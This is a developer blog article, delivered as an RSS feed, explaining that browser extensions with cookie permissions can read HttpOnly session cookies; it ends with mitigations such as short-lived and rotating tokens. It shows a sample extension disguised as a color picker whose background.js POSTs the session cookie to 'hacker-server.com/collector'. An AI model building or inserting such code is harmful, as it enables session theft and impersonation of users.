<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Use Case on fr0sttt</title><link>https://fr0sttt.dev/categories/use-case/</link><description>Recent content in Use Case on fr0sttt</description><generator>Hugo -- gohugo.io</generator><language>en</language><atom:link href="https://fr0sttt.dev/categories/use-case/index.xml" rel="self" type="application/rss+xml"/><item><title>Your HttpOnly Cookie Won't Save You From Everything: The Silent Attack via Browser Extensions</title><link>https://fr0sttt.dev/p/your-http-only-cookie-won-t-save-you-from-everything/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://fr0sttt.dev/p/your-http-only-cookie-won-t-save-you-from-everything/</guid><description>&lt;p>What? I&amp;rsquo;m using HttpOnly, SameSite cookies, but I&amp;rsquo;m still unsure?&lt;/p>
&lt;p>Let&amp;rsquo;s take it easy. You did everything correctly. However, there is a little-discussed risk: browser extensions.&lt;/p>
&lt;h1 id="understanding-session-risk-and-browser-extensions">Understanding Session Risk and Browser Extensions
&lt;/h1>&lt;p>As conscientious developers, we strive to follow best practices (I hope). You&amp;rsquo;ve probably already done your homework: ditched localStorage for sensitive data and protected your application&amp;rsquo;s session tokens with cookies configured as HttpOnly, Secure, and SameSite.&lt;/p>
&lt;p>This is excellent. It&amp;rsquo;s the fundamental foundation of session security on the modern web, and it protects against the vast majority of attacks, such as XSS.&lt;/p>
&lt;p>But security is a game of layers, like an onion. Today, we&amp;rsquo;ll explore a deeper, more subtle layer together, one that doesn&amp;rsquo;t involve a flaw in our code, but rather in the ecosystem in which our applications run: the user&amp;rsquo;s own browser and the trust model of extensions.&lt;/p>
&lt;p>Let&amp;rsquo;s talk about how the best-kept key can be copied if the homeowner hands over a master key to a friendly-looking stranger.&lt;/p>
&lt;h1 id="the-edge-of-the-fortress-where-httponly-protection-ends">The Edge of the Fortress: Where HttpOnly Protection Ends
&lt;/h1>&lt;p>To understand the risk, we first need to be clear about what the HttpOnly flag actually does.&lt;/p>
&lt;p>Think of it as a security rule within your &amp;ldquo;house&amp;rdquo; (your web page). The rule is clear: &amp;ldquo;No &amp;lsquo;guest&amp;rsquo; (script running on the page) may touch the family&amp;rsquo;s special cookies.&amp;rdquo; This perfectly neutralizes an XSS attack, where a malicious &amp;ldquo;guest&amp;rdquo; (an injected script) attempts to steal these cookies.&lt;/p>
&lt;p>The bottom line is this: &lt;strong>a browser extension isn&amp;rsquo;t just a &amp;ldquo;guest.&amp;rdquo; It&amp;rsquo;s the &amp;ldquo;building manager.&amp;rdquo;&lt;/strong>&lt;/p>
&lt;p>When a user installs an extension, the browser requests a series of permissions. By clicking &amp;ldquo;Accept,&amp;rdquo; the user isn&amp;rsquo;t just inviting the extension in; they&amp;rsquo;re handing it an administrator badge with elevated privileges. With this badge, the extension can operate at a level above the &amp;ldquo;house rules,&amp;rdquo; interacting directly with the browser&amp;rsquo;s APIs.&lt;/p>
&lt;h1 id="anatomy-of-an-attack-a-step-by-step-analysis">Anatomy of an Attack: A Step-by-Step Analysis
&lt;/h1>&lt;p>Let&amp;rsquo;s look at how a seemingly harmless extension like a &amp;ldquo;Color Converter&amp;rdquo; could be used to hijack a user session.&lt;/p>
&lt;h2 id="step-1-the-trust-agreement-the-manifestjson">Step 1: The Trust Agreement (The manifest.json)
&lt;/h2>&lt;p>Every extension declares its needs in a manifest file. This is where the request for privileges is made.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-json" data-lang="json">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;manifest_version&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;Super Color Picker&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;version&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;1.0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;description&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;Find the code for any color on your screen!&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;background&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;service_worker&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;background.js&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;permissions&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;cookies&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// Permission to access the Cookie API
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="s2">&amp;#34;activeTab&amp;#34;&lt;/span> &lt;span class="c1">// Permission to interact with the active tab
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">],&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;host_permissions&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;*://*.your-ecommerce.com/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// Specific permission for your site
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="s2">&amp;#34;*://*.company-dashboard.com/&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>The user sees a request that seems reasonable for the extension&amp;rsquo;s functionality and grants the permissions. They&amp;rsquo;ve given the extension the master key to read cookies on the specified domains.&lt;/p>
&lt;h2 id="step-2-the-behind-the-scenes-action-the-backgroundjs">Step 2: The Behind-the-Scenes Action (The background.js)
&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Inside the extension&amp;#39;s background.js
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">TARGET_DOMAIN&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;https://company-panel.com&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">COOKIE_NAME&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;session_id&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// The name of your application&amp;#39;s session cookie
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// This function is called when the user accesses the target site
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kr">async&lt;/span> &lt;span class="kd">function&lt;/span> &lt;span class="nx">extractCookie&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// The chrome.cookies.get API has privileges to access cookies,
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// bypassing the HttpOnly restriction that applies only to page scripts.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kr">const&lt;/span> &lt;span class="nx">cookie&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kr">await&lt;/span> &lt;span class="nx">chrome&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">cookies&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">get&lt;/span>&lt;span class="p">({&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">url&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">TARGET_DOMAIN&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">name&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">COOKIE_NAME&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">cookie&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Session cookie successfully intercepted.&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">const&lt;/span> &lt;span class="nx">token&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">cookie&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">value&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Send the token to a remote server controlled by the attacker
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sb">`https://hacker-server.com/collector`&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">method&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;POST&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">headers&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="s2">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;application/json&amp;#34;&lt;/span> &lt;span class="p">},&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">body&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">JSON&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">stringify&lt;/span>&lt;span class="p">({&lt;/span> &lt;span class="nx">domain&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">TARGET_DOMAIN&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">sessionToken&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">token&lt;/span> &lt;span class="p">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">catch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Error accessing cookie:&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">error&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Add a &amp;#34;listener&amp;#34; that triggers the function when the tab is updated
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">chrome&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">tabs&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">onUpdated&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">addListener&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">tabId&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">changeInfo&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">tab&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">changeInfo&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">status&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s2">&amp;#34;complete&amp;#34;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">tab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">url&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">startsWith&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">TARGET_DOMAIN&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">extractCookie&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">});&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Silently and invisibly to the user, the extension uses its privileges to read the session cookie and send it to an external server. The attacker can now use this token to impersonate the user.&lt;/p>
&lt;h1 id="an-important-distinction-site-vulnerability-vs-compromised-environment">An Important Distinction: Site Vulnerability vs. Compromised Environment
&lt;/h1>&lt;p>It&amp;rsquo;s crucial to differentiate between the following scenarios:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>XSS&lt;/code>: This is a &lt;strong>security flaw in your application&lt;/strong>. You, the developer, are responsible for preventing it. HttpOnly is your primary mitigation tool.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>Extension Hijacking&lt;/code>: This is a &lt;strong>compromise of the client&amp;rsquo;s environment&lt;/strong>. Your application may be perfectly secure. The problem lies in the user&amp;rsquo;s trust in third-party software.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h1 id="our-role-as-developers-creating-defense-in-depth">Our Role as Developers: Creating Defense in Depth
&lt;/h1>&lt;p>While we can&amp;rsquo;t control the extensions our users install, we can design our systems to be more resilient and limit the damage if a credential is compromised. This is called Defense in Depth.&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>Maintain Short-Lived Access Tokens&lt;/strong>: An access token that expires in 5 to 15 minutes drastically limits an attacker&amp;rsquo;s window of opportunity.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Consider Rotating Refresh Tokens&lt;/strong>: Implement rotation of single-use refresh tokens. If an old token is reused, it&amp;rsquo;s a warning sign that the session has been compromised, allowing you to invalidate it immediately.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Link the Session to Other Factors&lt;/strong>: On critical systems, add IP address or browser fingerprint checks to detect anomalies in session usage.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h1 id="a-real-world-example-why-banks-force-you-to-quit-your-browser">A Real-World Example: Why Banks Force You to Quit Your Browser
&lt;/h1>&lt;p>If all this talk about browser risks seems theoretical, let&amp;rsquo;s look at what the most security-paranoid institutions—banks—do.&lt;/p>
&lt;p>Have you ever wondered why banks like Itaú, and others insist that you install a &amp;ldquo;Security Module&amp;rdquo; or &amp;ldquo;Guardian&amp;rdquo; to access online banking on your computer? Why don&amp;rsquo;t they trust you to simply open the website in the browser, like everyone else?&lt;/p>
&lt;p>The answer is simple: they consider the default browser environment inherently insecure and hostile.&lt;/p>
&lt;p>They know they have no control over the extensions you&amp;rsquo;ve installed, or the potential malware or keyloggers running on your machine. Their conclusion is logical and drastic: &amp;ldquo;If we can&amp;rsquo;t trust the environment, we won&amp;rsquo;t play in it.&amp;rdquo;&lt;/p>
&lt;p>These security modules do several things:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>They attempt to create a &amp;ldquo;secure desktop,&amp;rdquo; isolating the banking session from other processes.&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>They actively monitor for known malware, keyloggers, and screen capture software.&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>They prevent other windows from overlapping the banking window (overlay attacks).&lt;/strong>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>Essentially, instead of trying to protect an application within an environment they don&amp;rsquo;t control, &lt;strong>they remove the application from the hostile environment.&lt;/strong> They force the user into a &amp;ldquo;bubble of trust,&amp;rdquo; a secure tunnel they manage themselves, minimizing the risks we discussed.&lt;/p>
&lt;p>This is defense in depth taken to the extreme. For most of us, e-commerce, SaaS, or admin panel developers, forcing users to install a desktop application is unfeasible. But the banks&amp;rsquo; logic teaches us a valuable lesson about the importance of distrusting the customer environment and building our own layers of resilience.&lt;/p>
&lt;h1 id="building-trust-on-solid-foundations">Building Trust on Solid Foundations
&lt;/h1>&lt;p>Securing our applications is an ongoing challenge. Configuring secure cookies with HttpOnly remains an essential and non-negotiable practice, as it protects us from the most common threat: XSS.&lt;/p>
&lt;p>Understanding the risk of extensions and observing banks&amp;rsquo; strategies does not diminish the importance of these measures. On the contrary, it reinforces the need to think about security holistically. Our job is to build systems that protect our users not only from vulnerabilities in our own code, but also from risks in the ecosystem in which our applications operate.&lt;/p></description></item></channel></rss>